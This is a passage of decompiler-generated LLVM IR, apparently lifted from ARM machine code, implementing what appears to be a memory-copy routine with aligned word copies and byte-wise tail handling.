  %v10_14740 = inttoptr i32 %v9_14740 to i32*
  %v11_14740 = load i32, i32* %lr.global-to-local, align 4
  store i32 %v11_14740, i32* %v10_14740, align 4
  %v12_14740 = add i32 %v0_14740, 16
  store i32 %v12_14740, i32* %r0.global-to-local, align 4
  %v0_14744 = load i32, i32* %r1.global-to-local, align 4
  %v1_14744 = inttoptr i32 %v0_14744 to i32*
  %v2_14744 = load i32, i32* %v1_14744, align 4
  store i32 %v2_14744, i32* @r3, align 4
  %v3_14744 = add i32 %v0_14744, 4
  %v4_14744 = inttoptr i32 %v3_14744 to i32*
  %v5_14744 = load i32, i32* %v4_14744, align 4
  store i32 %v5_14744, i32* %r4.global-to-local, align 4
  %v6_14744 = add i32 %v0_14744, 8
  %v7_14744 = inttoptr i32 %v6_14744 to i32*
  %v8_14744 = load i32, i32* %v7_14744, align 4
  store i32 %v8_14744, i32* @ip, align 4
  %v9_14744 = add i32 %v0_14744, 12
  %v10_14744 = inttoptr i32 %v9_14744 to i32*
  %v11_14744 = load i32, i32* %v10_14744, align 4
  store i32 %v11_14744, i32* %lr.global-to-local, align 4
  %v12_14744 = add i32 %v0_14744, 16
  store i32 %v12_14744, i32* %r1.global-to-local, align 4
  %v1_14748 = inttoptr i32 %v12_14740 to i32*
  store i32 %v2_14744, i32* %v1_14748, align 4
  %v3_14748 = add i32 %v0_14740, 20
  %v4_14748 = inttoptr i32 %v3_14748 to i32*
  %v5_14748 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v5_14748, i32* %v4_14748, align 4
  %v6_14748 = add i32 %v0_14740, 24
  %v7_14748 = inttoptr i32 %v6_14748 to i32*
  %v8_14748 = load i32, i32* @ip, align 4
  store i32 %v8_14748, i32* %v7_14748, align 4
  %v9_14748 = add i32 %v0_14740, 28
  %v10_14748 = inttoptr i32 %v9_14748 to i32*
  %v11_14748 = load i32, i32* %lr.global-to-local, align 4
  store i32 %v11_14748, i32* %v10_14748, align 4
  %v12_14748 = add i32 %v0_14740, 32
  store i32 %v12_14748, i32* %r0.global-to-local, align 4
  %v0_1474c = load i32, i32* %r2.global-to-local, align 4
  %v1_1474c = add i32 %v0_1474c, -32
  store i32 %v1_1474c, i32* %r2.global-to-local, align 4
  %v3_1474c = sub i32 31, %v0_1474c
  %v4_1474c = and i32 %v3_1474c, %v0_1474c
  %v5_1474c = icmp slt i32 %v4_1474c, 0
  %v6_1474c = icmp slt i32 %v1_1474c, 0
  %v2_14750 = xor i1 %v6_1474c, %v5_1474c
  br i1 %v2_14750, label %dec_label_pc_14754, label %dec_label_pc_1473c.dec_label_pc_1473c_crit_edge

dec_label_pc_1473c.dec_label_pc_1473c_crit_edge:  ; preds = %dec_label_pc_1473c
  %v0_1473c.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_1473c

dec_label_pc_14754:                               ; preds = %dec_label_pc_1473c
  %v1_14754 = add i32 %v0_1474c, -16
  %v3_14754 = add i32 %v0_1474c, 2147483616
  %v4_14754 = and i32 %v1_14754, %v3_14754
  %v5_14754 = icmp slt i32 %v4_14754, 0
  store i1 %v5_14754, i1* %cpsr_v.global-to-local, align 1
  %v6_14754 = icmp slt i32 %v1_14754, 0
  store i1 %v6_14754, i1* %cpsr_n.global-to-local, align 1
  %v7_14754 = icmp eq i32 %v1_14754, 0
  store i1 %v7_14754, i1* %cpsr_z.global-to-local, align 1
  %v2_14758 = xor i1 %v6_14754, %v5_14754
  br i1 %v2_14758, label %bb138, label %bb137

bb137:                                            ; preds = %dec_label_pc_14754
  %v3_14758 = load i32, i32* %r1.global-to-local, align 4
  %v4_14758 = inttoptr i32 %v3_14758 to i32*
  %v5_14758 = load i32, i32* %v4_14758, align 4
  store i32 %v5_14758, i32* @r3, align 4
  %v6_14758 = add i32 %v3_14758, 4
  %v7_14758 = inttoptr i32 %v6_14758 to i32*
  %v8_14758 = load i32, i32* %v7_14758, align 4
  store i32 %v8_14758, i32* %r4.global-to-local, align 4
  %v9_14758 = add i32 %v3_14758, 8
  %v10_14758 = inttoptr i32 %v9_14758 to i32*
  %v11_14758 = load i32, i32* %v10_14758, align 4
  store i32 %v11_14758, i32* @ip, align 4
  %v12_14758 = add i32 %v3_14758, 12
  %v13_14758 = inttoptr i32 %v12_14758 to i32*
  %v14_14758 = load i32, i32* %v13_14758, align 4
  store i32 %v14_14758, i32* %lr.global-to-local, align 4
  %v15_14758 = add i32 %v3_14758, 16
  store i32 %v15_14758, i32* %r1.global-to-local, align 4
  %v4_1475c = inttoptr i32 %v12_14748 to i32*
  store i32 %v5_14758, i32* %v4_1475c, align 4
  %v6_1475c = add i32 %v0_14740, 36
  %v7_1475c = inttoptr i32 %v6_1475c to i32*
  %v8_1475c = load i32, i32* %r4.global-to-local, align 4
  store i32 %v8_1475c, i32* %v7_1475c, align 4
  %v9_1475c = add i32 %v0_14740, 40
  %v10_1475c = inttoptr i32 %v9_1475c to i32*
  %v11_1475c = load i32, i32* @ip, align 4
  store i32 %v11_1475c, i32* %v10_1475c, align 4
  %v12_1475c = add i32 %v0_14740, 44
  %v13_1475c = inttoptr i32 %v12_1475c to i32*
  %v14_1475c = load i32, i32* %lr.global-to-local, align 4
  store i32 %v14_1475c, i32* %v13_1475c, align 4
  %v15_1475c = add i32 %v0_14740, 48
  store i32 %v15_1475c, i32* %r0.global-to-local, align 4
  %v3_14760 = load i32, i32* %r2.global-to-local, align 4
  %v4_14760 = add i32 %v3_14760, -16
  store i32 %v4_14760, i32* %r2.global-to-local, align 4
  br label %bb138

bb138:                                            ; preds = %dec_label_pc_14754, %bb137
  %v3_14770102111 = phi i32 [ %v15_1475c, %bb137 ], [ %v12_14748, %dec_label_pc_14754 ]
  %v0_14768.pre = phi i32 [ %v4_14760, %bb137 ], [ %v1_1474c, %dec_label_pc_14754 ]
  %v2_14764 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_14764, i32* @r4, align 4
  br label %dec_label_pc_14768

dec_label_pc_14768:                               ; preds = %dec_label_pc_14730, %bb138
  %v3_14770101 = phi i32 [ %v0_1474094, %dec_label_pc_14730 ], [ %v3_14770102111, %bb138 ]
  %v0_14768 = phi i32 [ %v1_14730, %dec_label_pc_14730 ], [ %v0_14768.pre, %bb138 ]
  %v1_14768 = add i32 %v0_14768, 20
  store i32 %v1_14768, i32* %r2.global-to-local, align 4
  %v3_14768 = sub i32 0, %v0_14768
  %v4_14768 = and i32 %v1_14768, %v3_14768
  %v5_14768 = icmp slt i32 %v4_14768, 0
  store i1 %v5_14768, i1* %cpsr_v.global-to-local, align 1
  %v6_14768 = icmp slt i32 %v1_14768, 0
  store i1 %v6_14768, i1* %cpsr_n.global-to-local, align 1
  %v7_14768 = icmp eq i32 %v1_14768, 0
  store i1 %v7_14768, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_1476c

dec_label_pc_1476c:                               ; preds = %.thread115, %dec_label_pc_14768
  %v0_1477c.pre158 = phi i32 [ %v0_1477c.pre, %.thread115 ], [ %v1_14768, %dec_label_pc_14768 ]
  %v3_14770 = phi i32 [ %v3_1477099116, %.thread115 ], [ %v3_14770101, %dec_label_pc_14768 ]
  %v1_14774 = phi i1 [ %v1_14778, %.thread115 ], [ %v5_14768, %dec_label_pc_14768 ]
  %v0_14774 = phi i1 [ %v0_14778, %.thread115 ], [ %v6_14768, %dec_label_pc_14768 ]
  %v2_1476c = xor i1 %v1_14774, %v0_14774
  br i1 %v2_1476c, label %.thread115, label %bb139

bb139:                                            ; preds = %dec_label_pc_1476c
  %v3_1476c = load i32, i32* %r1.global-to-local, align 4
  %v4_1476c = inttoptr i32 %v3_1476c to i32*
  %v5_1476c = load i32, i32* %v4_1476c, align 4
  store i32 %v5_1476c, i32* @r3, align 4
  %v6_1476c = add i32 %v3_1476c, 4
  %v7_1476c = inttoptr i32 %v6_1476c to i32*
  %v8_1476c = load i32, i32* %v7_1476c, align 4
  store i32 %v8_1476c, i32* @ip, align 4
  %v9_1476c = add i32 %v3_1476c, 8
  %v10_1476c = inttoptr i32 %v9_1476c to i32*
  %v11_1476c = load i32, i32* %v10_1476c, align 4
  store i32 %v11_1476c, i32* %lr.global-to-local, align 4
  %v12_1476c = add i32 %v3_1476c, 12
  store i32 %v12_1476c, i32* %r1.global-to-local, align 4
  %v4_14770 = inttoptr i32 %v3_14770 to i32*
  store i32 %v5_1476c, i32* %v4_14770, align 4
  %v6_14770 = add i32 %v3_14770, 4
  %v7_14770 = inttoptr i32 %v6_14770 to i32*
  %v8_14770 = load i32, i32* @ip, align 4
  store i32 %v8_14770, i32* %v7_14770, align 4
  %v9_14770 = add i32 %v3_14770, 8
  %v10_14770 = inttoptr i32 %v9_14770 to i32*
  %v11_14770 = load i32, i32* %lr.global-to-local, align 4
  store i32 %v11_14770, i32* %v10_14770, align 4
  %v12_14770 = add i32 %v3_14770, 12
  store i32 %v12_14770, i32* %r0.global-to-local, align 4
  %v3_14774 = load i32, i32* %r2.global-to-local, align 4
  %v4_14774 = add i32 %v3_14774, -12
  store i32 %v4_14774, i32* %r2.global-to-local, align 4
  %v6_14774 = sub i32 11, %v3_14774
  %v7_14774 = and i32 %v6_14774, %v3_14774
  %v8_14774 = icmp slt i32 %v7_14774, 0
  store i1 %v8_14774, i1* %cpsr_v.global-to-local, align 1
  %v9_14774 = icmp slt i32 %v4_14774, 0
  store i1 %v9_14774, i1* %cpsr_n.global-to-local, align 1
  %v10_14774 = icmp eq i32 %v3_14774, 12
  store i1 %v10_14774, i1* %cpsr_z.global-to-local, align 1
  br label %.thread115

.thread115:                                       ; preds = %dec_label_pc_1476c, %bb139
  %v0_1477c.pre = phi i32 [ %v4_14774, %bb139 ], [ %v0_1477c.pre158, %dec_label_pc_1476c ]
  %v3_1477099116 = phi i32 [ %v12_14770, %bb139 ], [ %v3_14770, %dec_label_pc_1476c ]
  %v1_14778 = phi i1 [ %v8_14774, %bb139 ], [ %v1_14774, %dec_label_pc_1476c ]
  %v0_14778 = phi i1 [ %v9_14774, %bb139 ], [ %v0_14774, %dec_label_pc_1476c ]
  %v2_14778 = xor i1 %v1_14778, %v0_14778
  br i1 %v2_14778, label %dec_label_pc_1477c, label %dec_label_pc_1476c

dec_label_pc_1477c:                               ; preds = %.thread115, %dec_label_pc_14728
  %v4_1478c = phi i32 [ %v0_1474094, %dec_label_pc_14728 ], [ %v3_1477099116, %.thread115 ]
  %v0_1477c = phi i32 [ %v1_14728, %dec_label_pc_14728 ], [ %v0_1477c.pre, %.thread115 ]
  %v1_1477c = add i32 %v0_1477c, 8
  store i32 %v1_1477c, i32* %r2.global-to-local, align 4
  %v3_1477c = sub i32 0, %v0_1477c
  %v4_1477c = and i32 %v1_1477c, %v3_1477c
  %v5_1477c = icmp slt i32 %v4_1477c, 0
  store i1 %v5_1477c, i1* %cpsr_v.global-to-local, align 1
  %v6_1477c = icmp slt i32 %v1_1477c, 0
  store i1 %v6_1477c, i1* %cpsr_n.global-to-local, align 1
  %v7_1477c = icmp eq i32 %v1_1477c, 0
  store i1 %v7_1477c, i1* %cpsr_z.global-to-local, align 1
  %v2_14780 = xor i1 %v6_1477c, %v5_1477c
  br i1 %v2_14780, label %bb141, label %dec_label_pc_14784

dec_label_pc_14784:                               ; preds = %dec_label_pc_1477c
  %v1_14784 = add i32 %v0_1477c, 4
  store i32 %v1_14784, i32* %r2.global-to-local, align 4
  %v3_14784 = sub i32 -5, %v0_1477c
  %v4_14784 = and i32 %v3_14784, %v1_1477c
  %v5_14784 = icmp slt i32 %v4_14784, 0
  store i1 %v5_14784, i1* %cpsr_v.global-to-local, align 1
  %v6_14784 = icmp slt i32 %v1_14784, 0
  store i1 %v6_14784, i1* %cpsr_n.global-to-local, align 1
  %v7_14784 = icmp eq i32 %v1_1477c, 4
  store i1 %v7_14784, i1* %cpsr_z.global-to-local, align 1
  %v2_14788 = xor i1 %v6_14784, %v5_14784
  %v3_14788 = load i32, i32* %r1.global-to-local, align 4
  %v4_14788 = inttoptr i32 %v3_14788 to i32*
  %v5_14788 = load i32, i32* %v4_14788, align 4
  store i32 %v5_14788, i32* @r3, align 4
  %v7_14788 = add i32 %v3_14788, 4
  br i1 %v2_14788, label %.thread122, label %bb140

.thread122:                                       ; preds = %dec_label_pc_14784
  store i32 %v7_14788, i32* %r1.global-to-local, align 4
  %v5_1478c = inttoptr i32 %v4_1478c to i32*
  store i32 %v5_14788, i32* %v5_1478c, align 4
  %v6_1478c = load i32, i32* %r0.global-to-local, align 4
  %v7_1478c = add i32 %v6_1478c, 4
  store i32 %v7_1478c, i32* %r0.global-to-local, align 4
  %v0_1479c.pre = load i32, i32* %r2.global-to-local, align 4
  br label %bb141

bb140:                                            ; preds = %dec_label_pc_14784
  %v7_14790 = inttoptr i32 %v7_14788 to i32*
  %v8_14790 = load i32, i32* %v7_14790, align 4
  store i32 %v8_14790, i32* @ip, align 4
  %v9_14790 = add i32 %v3_14788, 8
  store i32 %v9_14790, i32* %r1.global-to-local, align 4
  %v4_14794 = inttoptr i32 %v4_1478c to i32*
  store i32 %v5_14788, i32* %v4_14794, align 4
  %v6_14794 = add i32 %v4_1478c, 4
  %v7_14794 = inttoptr i32 %v6_14794 to i32*
  %v8_14794 = load i32, i32* @ip, align 4
  store i32 %v8_14794, i32* %v7_14794, align 4
  %v9_14794 = add i32 %v4_1478c, 8
  store i32 %v9_14794, i32* %r0.global-to-local, align 4
  %v3_14798 = load i32, i32* %r2.global-to-local, align 4
  %v4_14798 = add i32 %v3_14798, -4
  store i32 %v4_14798, i32* %r2.global-to-local, align 4
  br label %bb141

bb141:                                            ; preds = %.thread122, %.thread128, %dec_label_pc_1477c, %bb, %dec_label_pc_1494c, %dec_label_pc_148e0, %dec_label_pc_14874, %bb140
  %v0_1479c = phi i32 [ %v0_1479c.pre, %.thread122 ], [ %v2_147ec, %.thread128 ], [ %v1_1477c, %dec_label_pc_1477c ], [ %v2_14710, %bb ], [ %v0_1479c61, %dec_label_pc_1494c ], [ %v0_1479c60, %dec_label_pc_148e0 ], [ %v0_1479c59, %dec_label_pc_14874 ], [ %v4_14798, %bb140 ]
  %v1_1479c = add i32 %v0_1479c, 4
  store i32 %v1_1479c, i32* %r2.global-to-local, align 4
  %v3_1479c = sub i32 0, %v0_1479c
  %v4_1479c = and i32 %v1_1479c, %v3_1479c
  %v5_1479c = icmp slt i32 %v4_1479c, 0
  store i1 %v5_1479c, i1* %cpsr_v.global-to-local, align 1
  %v6_1479c = icmp slt i32 %v1_1479c, 0
  store i1 %v6_1479c, i1* %cpsr_n.global-to-local, align 1
  %v7_1479c = icmp eq i32 %v1_1479c, 0
  store i1 %v7_1479c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_1479c, label %bb142, label %bb141.bb143_crit_edge

bb141.bb143_crit_edge:                            ; preds = %bb141
  %v0_147a4.pre = load i32, i32* @r3, align 4
  br label %bb143

bb142:                                            ; preds = %bb141
  %v3_147a0 = load i8*, i8** %stack_var_-8, align 4
  %v4_147a0 = ptrtoint i8* %v3_147a0 to i32
  store i32 %v4_147a0, i32* %r0.global-to-local, align 4
  br label %bb143

bb143:                                            ; preds = %bb141.bb143_crit_edge, %bb142
  %v0_147a4 = phi i32 [ %v0_147a4.pre, %bb141.bb143_crit_edge ], [ %v8_1470c, %bb142 ]
  call void @__pseudo_cond_branch(i1 %v7_1479c, i32 %v0_147a4)
  %v0_147a8 = load i32, i32* %r2.global-to-local, align 4
  %v1_147a8 = add i32 %v0_147a8, -2
  %v3_147a8 = sub i32 1, %v0_147a8
  %v4_147a8 = and i32 %v3_147a8, %v0_147a8
  %v5_147a8 = icmp slt i32 %v4_147a8, 0
  store i1 %v5_147a8, i1* %cpsr_v.global-to-local, align 1
  %v6_147a8 = icmp slt i32 %v1_147a8, 0
  store i1 %v6_147a8, i1* %cpsr_n.global-to-local, align 1
  %v7_147a8 = icmp eq i32 %v0_147a8, 2
  store i1 %v7_147a8, i1* %cpsr_z.global-to-local, align 1
  %v0_147ac = load i32, i32* %r1.global-to-local, align 4
  %v1_147ac = inttoptr i32 %v0_147ac to i8*
  %v2_147ac = load i8, i8* %v1_147ac, align 1
  %v5_147ac = add i32 %v0_147ac, 1
  store i32 %v5_147ac, i32* %r1.global-to-local, align 4
  %v2_147b0 = load i32, i32* %r0.global-to-local, align 4
  %v3_147b0 = inttoptr i32 %v2_147b0 to i8*
  store i8 %v2_147ac, i8* %v3_147b0, align 1
  %v4_147b0 = load i32, i32* %r0.global-to-local, align 4
  %v5_147b0 = add i32 %v4_147b0, 1
  store i32 %v5_147b0, i32* %r0.global-to-local, align 4
  %v0_147b4 = load i1, i1* %cpsr_n.global-to-local, align 1
  %v1_147b4 = load i1, i1* %cpsr_v.global-to-local, align 1
  %v2_147b4 = xor i1 %v0_147b4, %v1_147b4
  br i1 %v2_147b4, label %.thread125, label %bb144

bb144:                                            ; preds = %bb143
  %v3_147b4 = load i32, i32* %r1.global-to-local, align 4
  %v4_147b4 = inttoptr i32 %v3_147b4 to i8*
  %v5_147b4 = load i8, i8* %v4_147b4, align 1
  %v8_147b4 = add i32 %v3_147b4, 1
  store i32 %v8_147b4, i32* %r1.global-to-local, align 4
  %v6_147b8 = inttoptr i32 %v5_147b0 to i8*
  store i8 %v5_147b4, i8* %v6_147b8, align 1
  %v7_147b8 = load i32, i32* %r0.global-to-local, align 4
  %v8_147b8 = add i32 %v7_147b8, 1
  store i32 %v8_147b8, i32* %r0.global-to-local, align 4
  %v1_147bc.pre = load i1, i1* %cpsr_n.global-to-local, align 1
  %v2_147bc.pre = load i1, i1* %cpsr_v.global-to-local, align 1
  br label %.thread125

.thread125:                                       ; preds = %bb143, %bb144
  %v7_147c0 = phi i32 [ %v8_147b8, %bb144 ], [ %v5_147b0, %bb143 ]
  %v2_147c0 = phi i1 [ %v2_147bc.pre, %bb144 ], [ %v1_147b4, %bb143 ]
  %v1_147c0 = phi i1 [ %v1_147bc.pre, %bb144 ], [ %v0_147b4, %bb143 ]
  %v0_147bc = load i1, i1* %cpsr_z.global-to-local, align 1
  %v3_147bc = xor i1 %v2_147c0, %v1_147c0
  %v4_147bc = or i1 %v0_147bc, %v3_147bc
  br i1 %v4_147bc, label %.thread126, label %bb145

bb145:                                            ; preds = %.thread125
  %v5_147bc = load i32, i32* %r1.global-to-local, align 4
  %v6_147bc = inttoptr i32 %v5_147bc to i8*
  %v7_147bc = load i8, i8* %v6_147bc, align 1
  %v10_147bc = add i32 %v5_147bc, 1
  store i32 %v10_147bc, i32* %r1.global-to-local, align 4
  %v8_147c0 = inttoptr i32 %v7_147c0 to i8*
  store i8 %v7_147bc, i8* %v8_147c0, align 1
  %v9_147c0 = load i32, i32* %r0.global-to-local, align 4
  %v10_147c0 = add i32 %v9_147c0, 1
  store i32 %v10_147c0, i32* %r0.global-to-local, align 4
  br label %.thread126

.thread126:                                       ; preds = %.thread125, %bb145
  %v2_147c4 = load i8*, i8** %stack_var_-8, align 4
  %v3_147c4 = ptrtoint i8* %v2_147c4 to i32
  store i32 %v3_147c4, i32* %r0.global-to-local, align 4
  call void @__pseudo_branch(i32 %v8_1470c)
  %v0_147cc.pre = load i32, i32* @ip, align 4
  %v0_147d4.pre = load i32, i32* %r1.global-to-local, align 4
  %v2_147d8.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_147cc

dec_label_pc_147cc:                               ; preds = %dec_label_pc_14718, %.thread126
  %v2_147d8 = phi i32 [ %v1_14700, %dec_label_pc_14718 ], [ %v2_147d8.pre, %.thread126 ]
  %v0_147d4 = phi i32 [ %v0_14700, %dec_label_pc_14718 ], [ %v0_147d4.pre, %.thread126 ]
  %v0_147cc = phi i32 [ %v1_14718, %dec_label_pc_14718 ], [ %v0_147cc.pre, %.thread126 ]
  %v1_147cc = sub i32 4, %v0_147cc
  store i32 %v1_147cc, i32* @ip, align 4
  %v1_147d0 = add i32 %v1_147cc, -2
  %v3_147d0 = sub i32 1, %v1_147cc
  %v4_147d0 = and i32 %v3_147d0, %v1_147cc
  %v5_147d0 = icmp slt i32 %v4_147d0, 0
  store i1 %v5_147d0, i1* %cpsr_v.global-to-local, align 1
  %v6_147d0 = icmp slt i32 %v1_147d0, 0
  store i1 %v6_147d0, i1* %cpsr_n.global-to-local, align 1
  %v7_147d0 = icmp eq i32 %v1_147cc, 2
  store i1 %v7_147d0, i1* %cpsr_z.global-to-local, align 1
  %v1_147d4 = inttoptr i32 %v0_147d4 to i8*
  %v2_147d4 = load i8, i8* %v1_147d4, align 1
  %v3_147d4 = zext i8 %v2_147d4 to i32
  store i32 %v3_147d4, i32* @r3, align 4
  %v5_147d4 = add i32 %v0_147d4, 1
  store i32 %v5_147d4, i32* %r1.global-to-local, align 4
  %v3_147d8 = inttoptr i32 %v2_147d8 to i8*
  store i8 %v2_147d4, i8* %v3_147d8, align 1
  %v4_147d8 = load i32, i32* %r0.global-to-local, align 4
  %v5_147d8 = add i32 %v4_147d8, 1
  store i32 %v5_147d8, i32* %r0.global-to-local, align 4
  %v0_147dc = load i1, i1* %cpsr_n.global-to-local, align 1
  %v1_147dc = load i1, i1* %cpsr_v.global-to-local, align 1
  %v2_147dc = xor i1 %v0_147dc, %v1_147dc
  br i1 %v2_147dc, label %.thread127, label %bb146

bb146:                                            ; preds = %dec_label_pc_147cc
  %v3_147dc = load i32, i32* %r1.global-to-local, align 4
  %v4_147dc = inttoptr i32 %v3_147dc to i8*
  %v5_147dc = load i8, i8* %v4_147dc, align 1
  %v6_147dc = zext i8 %v5_147dc to i32
  store i32 %v6_147dc, i32* @r3, align 4
  %v8_147dc = add i32 %v3_147dc, 1
  store i32 %v8_147dc, i32* %r1.global-to-local, align 4
  %v6_147e0 = inttoptr i32 %v5_147d8 to i8*
  store i8 %v5_147dc, i8* %v6_147e0, align 1
  %v7_147e0 = load i32, i32* %r0.global-to-local, align 4
  %v8_147e0 = add i32 %v7_147e0, 1
  store i32 %v8_147e0, i32* %r0.global-to-local, align 4
  %v1_147e4.pre = load i1, i1* %cpsr_n.global-to-local, align 1
  %v2_147e4.pre = load i1, i1* %cpsr_v.global-to-local, align 1
  br label %.thread127

.thread127:                                       ; preds = %dec_label_pc_147cc, %bb146
  %v7_147e8 = phi i32 [ %v8_147e0, %bb146 ], [ %v5_147d8, %dec_label_pc_147cc ]
  %v2_147e8 = phi i1 [ %v2_147e4.pre, %bb146 ], [ %v1_147dc, %dec_label_pc_147cc ]
  %v1_147e8 = phi i1 [ %v1_147e4.pre, %bb146 ], [ %v0_147dc, %dec_label_pc_147cc ]
  %v0_147e4 = load i1, i1* %cpsr_z.global-to-local, align 1
  %v3_147e4 = xor i1 %v2_147e8, %v1_147e8
  %v4_147e4 = or i1 %v0_147e4, %v3_147e4
  br i1 %v4_147e4, label %.thread128, label %bb147

bb147:                                            ; preds = %.thread127
  %v5_147e4 = load i32, i32* %r1.global-to-local, align 4
  %v6_147e4 = inttoptr i32 %v5_147e4 to i8*
  %v7_147e4 = load i8, i8* %v6_147e4, align 1
  %v8_147e4 = zext i8 %v7_147e4 to i32
  store i32 %v8_147e4, i32* @r3, align 4
  %v10_147e4 = add i32 %v5_147e4, 1
  store i32 %v10_147e4, i32* %r1.global-to-local, align 4
  %v8_147e8 = inttoptr i32 %v7_147e8 to i8*
  store i8 %v7_147e4, i8* %v8_147e8, align 1
  %v9_147e8 = load i32, i32* %r0.global-to-local, align 4
  %v10_147e8 = add i32 %v9_147e8, 1
  store i32 %v10_147e8, i32* %r0.global-to-local, align 4
  br label %.thread128

.thread128:                                       ; preds = %.thread127, %bb147
  %v0_1491c77 = phi i32 [ %v10_147e8, %bb147 ], [ %v7_147e8, %.thread127 ]
  %v0_147ec = load i32, i32* %r2.global-to-local, align 4
  %v1_147ec = load i32, i32* @ip, align 4
  %v2_147ec = sub i32 %v0_147ec, %v1_147ec
  store i32 %v2_147ec, i32* %r2.global-to-local, align 4
  %v4_147ec = xor i32 %v1_147ec, %v0_147ec
  %v5_147ec = xor i32 %v2_147ec, %v0_147ec
  %v6_147ec = and i32 %v5_147ec, %v4_147ec
  %v7_147ec = icmp slt i32 %v6_147ec, 0
  store i1 %v7_147ec, i1* %cpsr_v.global-to-local, align 1
  %v8_147ec = icmp slt i32 %v2_147ec, 0
  store i1 %v8_147ec, i1* %cpsr_n.global-to-local, align 1
  %v9_147ec = icmp eq i32 %v0_147ec, %v1_147ec
  store i1 %v9_147ec, i1* %cpsr_z.global-to-local, align 1
  %v2_147f0 = xor i1 %v8_147ec, %v7_147ec
  br i1 %v2_147f0, label %bb141, label %dec_label_pc_147f4

dec_label_pc_147f4:                               ; preds = %.thread128
  %v0_147f4 = load i32, i32* %r1.global-to-local, align 4
  %v1_147f4 = urem i32 %v0_147f4, 4
  store i32 %v1_147f4, i32* @ip, align 4
  store i1 false, i1* %cpsr_n.global-to-local, align 1
  %v2_147f4 = icmp eq i32 %v1_147f4, 0
  store i1 %v2_147f4, i1* %cpsr_z.global-to-local, align 1
  %extract.t131 = trunc i32 %v0_147f4 to i2
  br i1 %v2_147f4, label %dec_label_pc_14728, label %dec_label_pc_147fc

dec_label_pc_147fc:                               ; preds = %dec_label_pc_14720, %dec_label_pc_147f4
  %v0_1491c76 = phi i32 [ %v1_14700, %dec_label_pc_14720 ], [ %v0_1491c77, %dec_label_pc_147f4 ]
  %v0_14884 = phi i32 [ %v2_14710, %dec_label_pc_14720 ], [ %v2_147ec, %dec_label_pc_147f4 ]
  %v0_14804.off0 = phi i2 [ %extract.t, %dec_label_pc_14720 ], [ %extract.t131, %dec_label_pc_147f4 ]
  %v0_147fc = phi i32 [ %v0_14700, %dec_label_pc_14720 ], [ %v0_147f4, %dec_label_pc_147f4 ]
  %v1_147fc = and i32 %v0_147fc, -4
  store i32 %v1_147fc, i32* %r1.global-to-local, align 4
  %v1_14800 = inttoptr i32 %v1_147fc to i32*
  %v2_14800 = load i32, i32* %v1_14800, align 4
  store i32 %v2_14800, i32* %lr.global-to-local, align 4
  %v4_14800 = add i32 %v1_147fc, 4
  store i32 %v4_14800, i32* %r1.global-to-local, align 4
  %v1_1487c = add i32 %v0_14884, -12
  %v3_1487c = sub i32 11, %v0_14884
  %v4_1487c = and i32 %v3_1487c, %v0_14884
  %v5_1487c = icmp slt i32 %v4_1487c, 0
  store i1 %v5_1487c, i1* %cpsr_v.global-to-local, align 1
  %v6_1487c = icmp slt i32 %v1_1487c, 0
  store i1 %v6_1487c, i1* %cpsr_n.global-to-local, align 1
  %v7_1487c = icmp eq i32 %v0_14884, 12
  store i1 %v7_1487c, i1* %cpsr_z.global-to-local, align 1
  %v2_14880 = xor i1 %v6_1487c, %v5_1487c
  switch i2 %v0_14804.off0, label %dec_label_pc_14810 [
    i2 -1, label %dec_label_pc_148e8
    i2 -2, label %dec_label_pc_1487c
  ]

dec_label_pc_14810:                               ; preds = %dec_label_pc_147fc
  br i1 %v2_14880, label %dec_label_pc_1485c, label %dec_label_pc_14818

dec_label_pc_14818:                               ; preds = %dec_label_pc_14810
  store i32 %v1_1487c, i32* %r2.global-to-local, align 4
  %v3_1481c = load i32, i32* @r4, align 4
  store i32 %v3_1481c, i32* %stack_var_-16, align 4
  %v6_1481c = load i32, i32* @r5, align 4
  store i32 %v6_1481c, i32* %stack_var_-12, align 4
  br label %dec_label_pc_14820

dec_label_pc_14820:                               ; preds = %dec_label_pc_14820.dec_label_pc_14820_crit_edge, %dec_label_pc_14818
  %v0_14844 = phi i32 [ %v12_14844, %dec_label_pc_14820.dec_label_pc_14820_crit_edge ], [ %v0_1491c76, %dec_label_pc_14818 ]
  %v0_14824 = phi i32 [ %v0_14824.pre, %dec_label_pc_14820.dec_label_pc_14820_crit_edge ], [ %v4_14800, %dec_label_pc_14818 ]
  %v0_14820 = phi i32 [ %v0_14820.pre, %dec_label_pc_14820.dec_label_pc_14820_crit_edge ], [ %v2_14800, %dec_label_pc_14818 ]
  %v3_14820 = udiv i32 %v0_14820, 256
  %v1_14824 = inttoptr i32 %v0_14824 to i32*
  %v2_14824 = load i32, i32* %v1_14824, align 4
  store i32 %v2_14824, i32* %r4.global-to-local, align 4
  %v3_14824 = add i32 %v0_14824, 4
  %v4_14824 = inttoptr i32 %v3_14824 to i32*
  %v5_14824 = load i32, i32* %v4_14824, align 4
  store i32 %v5_14824, i32* %r5.global-to-local, align 4
  %v6_14824 = add i32 %v0_14824, 8
  %v7_14824 = inttoptr i32 %v6_14824 to i32*
  %v8_14824 = load i32, i32* %v7_14824, align 4
  store i32 %v8_14824, i32* %ip.global-to-local, align 4
  %v9_14824 = add i32 %v0_14824, 12
  %v10_14824 = inttoptr i32 %v9_14824 to i32*
  %v11_14824 = load i32, i32* %v10_14824, align 4
  store i32 %v11_14824, i32* %lr.global-to-local, align 4
  %v12_14824 = add i32 %v0_14824, 16
  store i32 %v12_14824, i32* %r1.global-to-local, align 4
  %v4_14828 = mul i32 %v2_14824, 16777216
  %v5_14828 = or i32 %v4_14828, %v3_14820
  store i32 %v5_14828, i32* @r3, align 4
  %v3_1482c = udiv i32 %v2_14824, 256
  %v4_14830 = mul i32 %v5_14824, 16777216
  %v5_14830 = or i32 %v4_14830, %v3_1482c
  store i32 %v5_14830, i32* %r4.global-to-local, align 4
  %v3_14834 = udiv i32 %v5_14824, 256
  %v4_14838 = mul i32 %v8_14824, 16777216
  %v5_14838 = or i32 %v4_14838, %v3_14834
  store i32 %v5_14838, i32* %r5.global-to-local, align 4
  %v3_1483c = udiv i32 %v8_14824, 256
  %v4_14840 = mul i32 %v11_14824, 16777216
  %v5_14840 = or i32 %v4_14840, %v3_1483c
  store i32 %v5_14840, i32* @ip, align 4
  %v1_14844 = inttoptr i32 %v0_14844 to i32*
  store i32 %v5_14828, i32* %v1_14844, align 4
